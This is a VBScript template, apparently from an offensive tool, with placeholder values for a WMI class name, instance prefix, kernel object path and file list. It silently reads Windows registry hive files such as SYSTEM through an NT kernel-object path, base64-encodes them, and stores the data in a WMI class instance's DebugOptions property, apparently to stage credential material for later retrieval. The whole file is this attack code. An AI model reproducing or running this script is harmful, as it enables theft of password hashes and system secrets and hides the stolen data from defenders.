On Error Resume Next

set fso = CreateObject("Scripting.FileSystemObject")
ClassName = "REPLACE_WITH_CLASSNAME"
InstancePrefix = "RELEACE_WITH_UUID"
KernelObject = "RELEACE_WITH_KERNELOBJECT"
Path = "RELEACE_WITH_PATH"

Main()

Function Main()
    files = Array(REPLACE_WITH_FILES)
    For each file in files
        If file = "system" Then
            Path = "\windows\system32\config\"
        Else
        End If
        ntPath = KernelObject & Path & file
        
        b64data = ReadFileWithNTPath(ntPath)
        If b64data <> "" Then
            LoadDataIntoClass file, b64data
        Else
        End If
    Next
End Function

Function ReadFileWithNTPath(ntPath)
    On Error Resume Next
    ReadFileWithNTPath = ""

    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary mode for registry files
    objStream.Open
    
    objStream.LoadFromFile(ntPath)
    If Err.Number = 0 Then
        binaryData = objStream.Read
        objStream.Close
        ' Convert binary data to base64
        Set oXML = CreateObject("Msxml2.DOMDocument")
        Set oNode = oXML.CreateElement("base64")
        oNode.dataType = "bin.base64"
        oNode.nodeTypedValue = binaryData
        ReadFileWithNTPath = oNode.text
        ' Cleanup
        Set oNode = Nothing
        Set oXML = Nothing
    Else
        objStream.Close
    End If
    
    Set objStream = Nothing
End Function

Function LoadDataIntoClass(filename, data)
    instanceName = InstancePrefix & "_" & filename
    
    On Error Resume Next
    Set objTestNewInst = GetObject("Winmgmts:root\cimv2:" & ClassName & ".CreationClassName=""" & instanceName & """")
    If Err.Number <> 0 Then
        Err.Clear
        wbemCimtypeString = 8
        Set objClass = GetObject("Winmgmts:root\cimv2:" & ClassName)
        Set objInstance = objClass.spawninstance_
        objInstance.CreationClassName = instanceName
        objInstance.DebugOptions = data
        objInstance.put_
    Else
    End If
End Function